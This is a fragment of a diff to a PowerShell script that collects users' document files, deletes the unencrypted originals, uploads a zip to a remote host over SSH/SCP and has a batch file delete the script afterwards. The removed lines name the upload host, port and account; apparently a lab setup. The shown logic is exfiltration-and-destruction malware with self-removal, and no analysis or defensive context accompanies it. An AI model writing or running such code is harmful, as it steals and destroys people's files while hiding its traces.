@@ -6,8 +6,6 @@
     And update.bat is run to delete the script.
 #>
 
-# Start new ssh session
-# New-SSHSession -ComputerName '192.168.6.71' -Credential (Get-Credential 'blaise.notter@cyber.local') -Port '2222'
 
 # Locate files to be extracted
 $fileList = Get-ChildItem -Recurse -Include *.docx,*.pdf, *.xlsx, *.txt -Path .\Documents 
@@ -31,8 +29,7 @@ Remove-Item -Path $UnencFiles -Recurse
 
 
 # Upload a file to remote host
-# Set-SCPItem -ComputerName '192.168.6.71' -Port '2222' -Credential (Get-Credential 'blaise.notter@cyber.local') `
-#-Destination '/home/blaise.notter' -Path 'C:\Windows\Temp\UnEncrypted.zip'
+
 
 # if ((Invoke-SSHCommand -index 0 'dir UnEncrypted.zip').ExitStatus -eq 0 ) {
     
